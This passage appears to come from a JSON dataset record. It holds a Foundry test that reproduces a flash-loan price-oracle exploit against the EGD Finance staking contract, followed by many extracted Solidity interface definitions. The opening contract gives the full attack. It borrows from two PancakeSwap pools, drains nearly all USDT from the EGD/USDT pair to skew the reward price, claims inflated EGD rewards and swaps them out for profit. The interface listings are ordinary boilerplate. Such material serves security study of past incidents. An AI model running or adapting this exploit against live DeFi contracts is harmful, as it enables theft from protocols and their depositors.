log_named_decimal_uint(\"[INFO] Current earned reward (EGD token)\", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18);\n        console.log(\"Attacker manipulating price oracle of EGD Finance...\");\n        exploit.harvest();\n        console.log(\"-------------------------------- End Exploit ----------------------------------\");\n        emit log_named_decimal_uint(\"[End] Attacker USDT Balance\", IERC20(usdt).balanceOf(address(this)), 18);\n    }\n}\ncontract Exploit is Test {\n    uint256 borrow1;\n    uint256 borrow2;\n    function stake() public {\n        // Give exploit contract 100 USDT\n        deal(address(usdt), address(this), 100 ether);\n        // Set invitor\n        IEGD_Finance(EGD_Finance).bond(address(0x659b136c49Da3D9ac48682D02F7BD8806184e218));\n        // Stake 100 USDT\n        IERC20(usdt).approve(EGD_Finance, 100 ether);\n        IEGD_Finance(EGD_Finance).stake(100 ether);\n    }\n    function harvest() public {\n        console.log(\"Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve\");\n        borrow1 = 2000 * 1e18;\n        USDT_WBNB_LPPool.swap(borrow1, 0, address(this), \"0000\");\n        console.log(\"Flashloan[1] payback success\");\n        IERC20(usdt).transfer(msg.sender, IERC20(usdt).balanceOf(address(this))); // refund all USDT\n    }\n    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        if (keccak256(data) == keccak256(\"0000\")) {\n            console.log(\"Flashloan[1] received\");\n            console.log(\"Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve\");\n            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9_999_999_925 / 10_000_000_000; // Attacker borrows 99.99999925% USDT of EGD_USDT_LPPool reserve\n            EGD_USDT_LPPool.swap(0, borrow2, address(this), \"00\");\n            console.log(\"Flashloan[2] payback success\");\n            // Swap all egd -> usdt\n            console.log(\"Swap the profit...\");\n            address[] memory path = new address[](2);\n            path[0] = egd;\n            path[1] = usdt;\n            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);\n            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(IERC20(egd).balanceOf(address(this)), 1, path, address(this), block.timestamp);\n            bool suc = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 * 1e18); \n            require(suc, \"Flashloan[1] payback failed\");\n        } else {\n            console.log(\"Flashloan[2] received\");\n            emit log_named_decimal_uint(\"[INFO] EGD/USDT Price after price manipulation\", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);\n            // -----------------------------------------------------------------\n            console.log(\"Claim all EGD Token reward from EGD Finance contract\");\n            IEGD_Finance(EGD_Finance).claimAllReward();\n            emit log_named_decimal_uint(\"[INFO] Get reward (EGD token)\", IERC20(egd).balanceOf(address(this)), 18);\n            // -----------------------------------------------------------------\n            uint256 swapfee = (amount1 * 10000 / 9970) - amount1; // Attacker needs to pay >0.25% fee back to Pancakeswap\n            bool suc = IERC20(usdt).transfer(address(EGD_USDT_LPPool), amount1 + swapfee);\n            require(suc, \"Flashloan[2] payback failed\");\n        }\n    }\n}\ninterface IEGD_Finance {\n    function bond(address invitor) external;\n    function stake(uint256 amount) external;\n    function calculateAll(address addr) external view returns (uint256);\n    function claimAllReward() external;\n    function getEGDPrice() external view returns (uint256);\n}",
                "token_count": 1745,
                "interfaces": [
                    {
                        "name": "IEGD_Finance",
                        "content": "interface IEGD_Finance {\n    function bond(address invitor) external;\n    function stake(uint256 amount) external;\n    function calculateAll(address addr) external view returns (uint256);\n    function claimAllReward() external;\n    function getEGDPrice() external view returns (uint256);\n}",
                        "token_count": 62,
                        "imported": false
                    },
                    {
                        "name": "CheatCodes",
                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, (who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    },
                    {
                        "name": "IERC20",
                        "content": "interface IERC20 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function decimals() external view returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n  function withdraw(uint256 wad) external;\n  function deposit(uint256 wad) external returns (bool);\n  function owner() external view virtual returns (address);\n}\n",
                        "token_count": 205,
                        "imported": true
                    },
                    {
                        "name": "ICErc20Delegate",
                        "content": "interface ICErc20Delegate {\n  event AccrueInterest(\n    uint256 cashPrior,\n    uint256 interestAccumulated,\n    uint256 borrowIndex,\n    uint256 totalBorrows\n  );\n  event Approval(\n    address indexed owner,\n    address indexed spender,\n    uint256 amount\n  );\n  event Borrow(\n    address borrower,\n    uint256 borrowAmount,\n    uint256 accountBorrows,\n    uint256 totalBorrows\n  );\n  event Failure(uint256 error, uint256 info, uint256 detail);\n  event LiquidateBorrow(\n    address liquidator,\n    address borrower,\n    uint256 repayAmount,\n    address cTokenCollateral,\n    uint256 seizeTokens\n  );\n  event Mint(address minter, uint256 mintAmount, uint256 mintTokens);\n  event NewAdmin(address oldAdmin, address newAdmin);\n  event NewComptroller(address oldComptroller, address newComptroller);\n  event NewMarketInterestRateModel(\n    address oldInterestRateModel,\n    address newInterestRateModel\n  );\n  event NewPendingAdmin(address oldPendingAdmin, address newPendingAdmin);\n  event NewReserveFactor(\n    uint256 oldReserveFactorMantissa,\n    uint256 newReserveFactorMantissa\n  );\n  event Redeem(address redeemer, uint256 redeemAmount, uint256 redeemTokens);\n  event RepayBorrow(\n    address payer,\n    address borrower,\n    uint256 repayAmount,\n    uint256 accountBorrows,\n    uint256 totalBorrows\n  );\n  event ReservesAdded(\n    address benefactor,\n    uint256 addAmount,\n    uint256 newTotalReserves\n  );\n  event ReservesReduced(\n    address admin,\n    uint256 reduceAmount,\n    uint256 newTotalReserves\n  );\n  event Transfer(address indexed from, address indexed to, uint256 amount);\n\n  function _acceptAdmin() external returns (uint256);\n\n  function _addReserves(uint256 addAmount) external returns (uint256);\n\n  function _becomeImplementation(bytes memory data) external;\n\n  function _delegateCompLikeTo(address compLikeDelegatee) external;\n\n  function _reduceReserves(uint256 reduceAmount) external returns (uint256);\n\n  function _resignImplementation() external;\n\n  function _setComptroller(address newComptroller) external returns (uint256);\n\n  function _setInterestRateModel(address newInterestRateModel)\n  external\n  returns (uint256);\n\n  function _setPendingAdmin(address newPendingAdmin) external returns (uint256);\n\n  function _setReserveFactor(uint256 newReserveFactorMantissa)\n  external\n  returns (uint256);\n\n  function accrualBlockNumber() external view returns (uint256);\n\n  function accrueInterest() external returns (uint256);\n\n  function admin() external view returns (address);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 amount) external returns (bool);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function balanceOfUnderlying(address owner) external returns (uint256);\n\n  function borrow(uint256 borrowAmount) external returns (uint256);\n\n  function borrowBalanceCurrent(address account) external returns (uint256);\n\n  function borrowBalanceStored(address account) external view returns (uint256);\n\n  function borrowIndex() external view returns (uint256);\n\n  function borrowRatePerBlock() external view returns (uint256);\n\n  function comptroller() external view returns (address);\n\n  function decimals() external view returns (uint8);\n\n  function exchangeRateCurrent() external returns (uint256);\n\n  function exchangeRateStored() external view returns (uint256);\n\n  function getAccountSnapshot(address account)\n  external\n  view\n  returns (\n    uint256,\n    uint256,\n    uint256,\n    uint256\n  );\n\n  function getCash() external view returns (uint256);\n\n  function implementation() external view returns (address);\n\n  function initialize(\n    address underlying_,\n    address comptroller_,\n    address interestRateModel_,\n    uint256 initialExchangeRateMantissa_,\n    string memory name_,\n    string memory symbol_,\n    uint8 decimals_\n  ) external;\n\n  function initialize(\n    address comptroller_,\n    address interestRateModel_,\n    uint256 initialExchangeRateMantissa_,\n    string memory name_,\n    string memory symbol_,\n    uint8 decimals_\n  ) external;\n\n  function interestRateModel() external view returns (address);\n\n  function isCToken() external view returns (bool);\n\n  function liquidateBorrow(\n    address borrower,\n    uint256 repayAmount,\n    address cTokenCollateral\n  ) external returns (uint256);\n\n  function mint(uint256 mintAmount) external returns (uint256);\n\n  function name() external view returns (string memory);\n\n  function pendingAdmin() external view returns (address);\n\n  function protocolSeizeShareMantissa() external view returns (uint256);\n\n  function redeem(uint256 redeemTokens) external returns (uint256);\n\n  function redeemUnderlying(uint256 redeemAmount) external returns (uint256);\n\n  function repayBorrow(uint256 repayAmount) external returns (uint256);\n\n  function repayBorrowBehalf(address borrower, uint256 repayAmount)\n  external\n  returns (uint256);\n\n  function reserveFactorMantissa() external view returns (uint256);\n\n  function seize(\n    address liquidator,\n    address borrower,\n    uint256 seizeTokens\n  ) external returns (uint256);\n\n  function supplyRatePerBlock() external view returns (uint256);\n\n  function sweepToken(address token) external;\n\n  function symbol() external view returns (string memory);\n\n  function totalBorrows() external view returns (uint256);\n\n  function totalBorrowsCurrent() external returns (uint256);\n\n  function totalReserves() external view returns (uint256);\n\n  function totalSupply() external view returns (uint256);\n\n  function transfer(address dst, uint256 amount) external returns (bool);\n\n  function transferFrom(\n    address src,\n    address dst,\n    uint256 amount\n  ) external returns (bool);\n\n  function underlying() external view returns (address);\n}\n",
                        "token_count": 1282,
                        "imported": true
                    },
                    {
                        "name": "ERC1820Registry",
                        "content": "interface ERC1820Registry {\n  function setInterfaceImplementer(\n    address _addr,\n    bytes32 _interfaceHash,\n    address _implementer\n  ) external;\n}\n",
                        "token_count": 36,
                        "imported": true
                    },
                    {
                        "name": "IUniswapV2Factory",
                        "content": "interface IUniswapV2Factory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    function feeTo() external view returns (address);\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setFeeTo(address) external;\n    function setFeeToSetter(address) external;\n}\n",
                        "token_count": 133,
                        "imported": true
                    },
                    {
                        "name": "IUniswapV2Pair",
                        "content": "interface IUniswapV2Pair {\n    function swap(\n      uint256 amount0Out,\n      uint256 amount1Out,\n      address to,\n      bytes calldata data\n    ) external;\n    function skim(address to) external;\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n    function price0CumulativeLast() external view returns (uint);\n    function price1CumulativeLast() external view returns (uint);\n    function balanceOf(address account) external view returns (uint256);\n}\n",
                        "token_count": 140,
                        "imported": true
                    },
                    {
                        "name": "IBacon",
                        "content": "interface IBacon {\n  function lend(uint256 index) external;\n\n  function redeem(uint256 index) external;\n\n  function balanceOf(address account) external view returns (uint256);\n}\n",
                        "token_count": 37,
                        "imported": true
                    },
                    {
                        "name": "IACOWriter",
                        "content": "interface IACOWriter {\n  function erc20proxy() external view returns (address);\n\n  function weth() external view returns (address);\n\n  function write(\n    address acoToken,\n    uint256 collateralAmount,\n    address exchangeAddress,\n    bytes memory exchangeData\n  ) external payable;\n\n  receive() external payable;\n}\n",
                        "token_count": 69,
                        "imported": true
                    },
                    {
                        "name": "IRevest",
                        "content": "interface IRevest {\n  struct FNFTConfig {\n    address asset;\n    address pipeToContract;\n    uint256 depositAmount;\n    uint256 depositMul;\n    uint256 split;\n    uint256 depositStopTime;\n    bool maturityExtension;\n    bool isMulti;\n    bool nontransferrable;\n  }\n\n  event FNFTAddionalDeposited(\n    address indexed from,\n    uint256 indexed newFNFTId,\n    uint256 indexed quantity,\n    uint256 amount\n  );\n  event FNFTAddressLockMinted(\n    address indexed asset,\n    address indexed from,\n    uint256 indexed fnftId,\n    address trigger,\n    uint256[] quantities,\n    FNFTConfig fnftConfig\n  );\n  event FNFTMaturityExtended(\n    address indexed from,\n    uint256 indexed fnftId,\n    uint256 indexed newExtendedTime\n  );\n  event FNFTSplit(\n    address indexed from,\n    uint256[] indexed newFNFTId,\n    uint256[] indexed proportions,\n    uint256 quantity\n  );\n  event FNFTTimeLockMinted(\n    address indexed asset,\n    address indexed from,\n    uint256 indexed fnftId,\n    uint256 endTime,\n    uint256[] quantities,\n    FNFTConfig fnftConfig\n  );\n  event FNFTUnlocked(address indexed from, uint256 indexed fnftId);\n  event FNFTValueLockMinted(\n    address indexed primaryAsset,\n    address indexed from,\n    uint256 indexed fnftId,\n    address compareTo,\n    address oracleDispatch,\n    uint256[] quantities,\n    FNFTConfig fnftConfig\n  );\n  event FNFTWithdrawn(\n    address indexed from,\n    uint256 indexed fnftId,\n    uint256 indexed quantity\n  );\n  event OwnershipTransferred(\n    address indexed previousOwner,\n    address indexed newOwner\n  );\n  event RoleAdminChanged(\n    bytes32 indexed role,\n    bytes32 indexed previousAdminRole,\n    bytes32 indexed newAdminRole\n  );\n  event RoleGranted(\n    bytes32 indexed role,\n    address indexed account,\n    address indexed sender\n  );\n  event RoleRevoked(\n    bytes32 indexed role,\n    address indexed account,\n    address indexed sender\n  );\n\n  function ADDRESS_LOCK_INTERFACE_ID() external view returns (bytes4);\n\n  function DEFAULT_ADMIN_ROLE() external view returns (bytes32);\n\n  function PAUSER_ROLE() external view returns (bytes32);\n\n  function depositAdditionalToFNFT(\n    uint256 fnftId,\n    uint256 amount,\n    uint256 quantity\n  ) external returns (uint256);\n\n  function erc20Fee() external view returns (uint256);\n\n  function extendFNFTMaturity(uint256 fnftId, uint256 endTime)\n  external\n  returns (uint256);\n\n  function flatWeiFee() external view returns (uint256);\n\n  function getAddressesProvider() external view returns (address);\n\n  function getERC20Fee() external view returns (uint256);\n\n  function getFlatWeiFee() external view returns (uint256);\n\n  function getRoleAdmin(bytes32 role) external view returns (bytes32);\n\n  function getRoleMember(bytes32 role, uint256 index)\n  external\n  view\n  returns (address);\n\n  function getRoleMemberCount(bytes32 role) external view returns (uint256);\n\n  function grantRole(bytes32 role, address account) external;\n\n  function hasRole(bytes32 role, address account) external view returns (bool);\n\n  function mintAddressLock(\n    address trigger,\n    bytes memory arguments,\n    address[] memory recipients,\n    uint256[] memory quantities,\n    FNFTConfig memory fnftConfig\n  ) external payable returns (uint256);\n\n  function mintTimeLock(\n    uint256 endTime,\n    address[] memory recipients,\n    uint256[] memory quantities,\n    FNFTConfig memory fnftConfig\n  ) external payable returns (uint256);\n\n  function mintValueLock(\n    address primaryAsset,\n    address compareTo,\n    uint256 unlockValue,\n    bool unlockRisingEdge,\n    address oracleDispatch,\n    address[] memory recipients,\n    uint256[] memory quantities,\n    FNFTConfig memory fnftConfig\n  ) external payable returns (uint256);\n\n  function owner() external view returns (address);\n\n  function renounceOwnership() external;\n\n  function renounceRole(bytes32 role, address account) external;\n\n  function revokeRole(bytes32 role, address account) external;\n\n  function setAddressRegistry(address registry) external;\n\n  function setERC20Fee(uint256 erc20) external;\n\n  function setFlatWeiFee(uint256 wethFee) external;\n\n  function splitFNFT(\n    uint256 fnftId,\n    uint256[] memory proportions,\n    uint256 quantity\n  ) external returns (uint256[] memory);\n\n  function supportsInterface(bytes4 interfaceId) external view returns (bool);\n\n  function transferOwnership(address newOwner) external;\n\n  function unlockFNFT(uint256 fnftId) external;\n\n  function withdrawFNFT(uint256 fnftId, uint256 quantity) external;\n}\n",
                        "token_count": 1039,
                        "imported": true
                    },
                    {
                        "name": "AnyswapV4Router",
                        "content": "interface AnyswapV4Router {\n  function anySwapOutUnderlyingWithPermit(\n    address from,\n    address token,\n    address to,\n    uint256 amount,\n    uint256 deadline,\n    uint8 v,\n    bytes32 r,\n    bytes32 s,\n    uint256 toChainID\n  ) external;\n}\n",
                        "token_count": 68,
                        "imported": true
                    },
                    {
                        "name": "WETH",
                        "content": "interface WETH {\n  function approve(address guy, uint256 wad) external returns (bool);\n\n  function withdraw(uint256 wad) external;\n\n  function balanceOf(address) external view returns (uint256);\n\n  function transfer(address dst, uint256 wad) external returns (bool);\n}\n",
                        "token_count": 60,
                        "imported": true
                    },
                    {
                        "name": "AnyswapV1ERC20",
                        "content": "interface AnyswapV1ERC20 {\n  function mint(address to, uint256 amount) external returns (bool);\n\n  function burn(address from, uint256 amount) external returns (bool);\n\n  function changeVault(address newVault) external returns (bool);\n\n  function depositVault(uint256 amount, address to) external returns (uint256);\n\n  function withdrawVault(\n    address from,\n    uint256 amount,\n    address to\n  ) external returns (uint256);\n\n  function underlying() external view returns (address);\n}\n",
                        "token_count": 106,
                        "imported": true
                    },
                    {
                        "name": "IERC1820Registry",
                        "content": "interface IERC1820Registry {\n  function setInterfaceImplementer(\n    address _addr,\n    bytes32 _interfaceHash,\n    address _implementer\n  ) external;\n\n  function getManager(address _addr) external view returns (address);\n\n  function setManager(address _addr, address _newManager) external;\n\n  function interfaceHash(string memory _interfaceName)\n  external\n  pure\n  returns (bytes32);\n\n  function updateERC165Cache(address _contract, bytes4 _interfaceId) external;\n\n  function getInterfaceImplementer(address _addr, bytes32 _interfaceHash)\n  external\n  view\n  returns (address);\n\n  function implementsERC165InterfaceNoCache(\n    address _contract,\n    bytes4 _interfaceId\n  ) external view returns (bool);\n\n  function implementsERC165Interface(address _contract, bytes4 _interfaceId)\n  external\n  view\n  returns (bool);\n\n  event InterfaceImplementerSet(\n    address indexed addr,\n    bytes32 indexed interfaceHash,\n    address indexed implementer\n  );\n  event ManagerChanged(address indexed addr, address indexed newManager);\n}\n",
                        "token_count": 229,
                        "imported": true
                    },
                    {
                        "name": "IERC777",
                        "content": "interface IERC777 {\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function granularity() external view returns (uint256);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function send(\n    address recipient,\n    uint256 amount,\n    bytes calldata data\n  ) external;\n\n  function burn(uint256 amount, bytes calldata data) external;\n\n  function isOperatorFor(address operator, address tokenHolder)\n  external\n  view\n  returns (bool);\n\n  function authorizeOperator(address operator) external;\n\n  function revokeOperator(address operator) external;\n\n  function defaultOperators() external view returns (address[] memory);\n\n  function operatorSend(\n    address sender,\n    address recipient,\n    uint256 amount,\n    bytes calldata data,\n    bytes calldata operatorData\n  ) external;\n\n  function operatorBurn(\n    address account,\n    uint256 amount,\n    bytes calldata data,\n    bytes calldata operatorData\n  ) external;\n\n  event Sent(\n    address indexed operator,\n    address indexed from,\n    address indexed to,\n    uint256 amount,\n    bytes data,\n    bytes operatorData\n  );\n\n  event Minted(\n    address indexed operator,\n    address indexed to,\n    uint256 amount,\n    bytes data,\n    bytes operatorData\n  );\n\n  event Burned(\n    address indexed operator,\n    address indexed from,\n    uint256 amount,\n    bytes data,\n    bytes operatorData\n  );\n\n  event AuthorizedOperator(\n    address indexed operator,\n    address indexed tokenHolder\n  );\n\n  event RevokedOperator(address indexed operator, address indexed tokenHolder);\n}\n",
                        "token_count": 381,
                        "imported": true
                    },
                    {
                        "name": "Uni_Pair_V3",
                        "content": "interface Uni_Pair_V3 {\n  function token0() external view returns (address);\n  function token1() external view returns (address);\n  function swap(\n        address recipient,\n        bool zeroForOne,\n        int256 amountSpecified,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external returns (int256 amount0, int256 amount1);\n  function flash(\n        address recipient,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external;\n}\n",
                        "token_count": 111,
                        "imported": true
                    },
                    {
                        "name": "Uni_Pair_V2",
                        "content": "interface Uni_Pair_V2 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Burn(\n    address indexed sender,\n    uint256 amount0,\n    uint256 amount1,\n    address indexed to\n  );\n  event Mint(address indexed sender, uint256 amount0, uint256 amount1);\n  event Swap(\n    address indexed sender,\n    uint256 amount0In,\n    uint256 amount1In,\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address indexed to\n  );\n  event Sync(uint112 reserve0, uint112 reserve1);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n  function MINIMUM_LIQUIDITY() external view returns (uint256);\n\n  function PERMIT_TYPEHASH() external view returns (bytes32);\n\n  function allowance(address, address) external view returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function balanceOf(address) external view returns (uint256);\n\n  function burn(address to) external returns (uint256 amount0, uint256 amount1);\n\n  function decimals() external view returns (uint8);\n\n  function factory() external view returns (address);\n\n  function getReserves()\n  external\n  view\n  returns (\n    uint112 _reserve0,\n    uint112 _reserve1,\n    uint32 _blockTimestampLast\n  );\n\n  function initialize(address _token0, address _token1) external;\n\n  function kLast() external view returns (uint256);\n\n  function mint(address to) external returns (uint256 liquidity);\n\n  function name() external view returns (string memory);\n\n  function nonces(address) external view returns (uint256);\n\n  function permit(\n    address owner,\n    address spender,\n    uint256 value,\n    uint256 deadline,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external;\n\n  function price0CumulativeLast() external view returns (uint256);\n\n  function price1CumulativeLast() external view returns (uint256);\n\n  function skim(address to) external;\n\n  function swap(\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address to,\n    bytes memory data\n  ) external;\n\n  function symbol() external view returns (string memory);\n\n  function sync() external;\n\n  function token0() external view returns (address);\n\n  function token1() external view returns (address);\n\n  function totalSupply() external view returns (uint256);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n}\n",
                        "token_count": 569,
                        "imported": true
                    },
                    {
                        "name": "Uni_Router_V3",
